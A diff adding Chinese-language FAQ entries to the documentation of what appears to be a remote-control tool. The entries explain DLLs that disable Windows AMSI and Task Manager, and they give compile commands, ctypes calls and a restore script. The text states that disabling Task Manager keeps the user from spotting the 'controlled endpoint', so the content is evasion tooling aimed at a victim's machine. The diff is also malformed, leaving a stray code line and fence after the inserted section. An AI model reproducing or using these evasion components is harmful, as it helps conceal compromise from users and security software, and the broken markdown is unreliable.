@@ -198,6 +198,51 @@ g++ -shared -o KillAMSI.dll KillAMSI.cpp -ladvapi32
 ```python
 import ctypes
 dll = ctypes.CDLL("KillAMSI.dll")
+dll.KillAmsi()
+```
+
+---
+
+### Q: `KillTaskManager.cpp` 有什么作用？
+
+`KillTaskManager.cpp` 是一个独立的 C++ DLL 工具，用于通过注册表禁用 Windows 任务管理器：
+
+```cpp
+// 设置 DisableTaskMgr = 1
+RegSetValueEx(hkey, TEXT("DisableTaskMgr"), 0, REG_DWORD, ...);
+```
+
+**作用**：禁用任务管理器可防止用户通过 `Ctrl+Alt+Del` 或右键任务栏打开任务管理器，增加被控端的隐蔽性。
+
+**编译方法**：
+
+```bash
+g++ -shared -o KillTaskManager.dll KillTaskManager.cpp -ladvapi32
+```
+
+**注意事项**：
+
+- 需要**管理员权限**才能写入注册表策略
+- 修改的是 HKCU（当前用户），不影响其他用户
+- 重启后生效，或调用后立即生效
+
+### Q: 如何调用 `KillTaskManager`？
+
+```python
+import ctypes
+dll = ctypes.CDLL("KillTaskManager.dll")
+dll.KillTaskManager()
+```
+
+### Q: `恢复.bat` 有什么作用？
+
+`恢复.bat` 是一个一键恢复脚本，用于重新启用被上述工具禁用的功能：
+
+- **恢复 AMSI**：将 `AmsiEnable` 设回 `1`
+- **恢复任务管理器**：将 `DisableTaskMgr` 设回 `0`
+- **自动重启资源管理器**：使注册表更改立即生效
+
+**使用方法**：以管理员身份运行 `恢复.bat`（右键 → 以管理员身份运行）。
 result = dll.KillAmsi()  # 返回 0 成功，1 失败
 ```
 
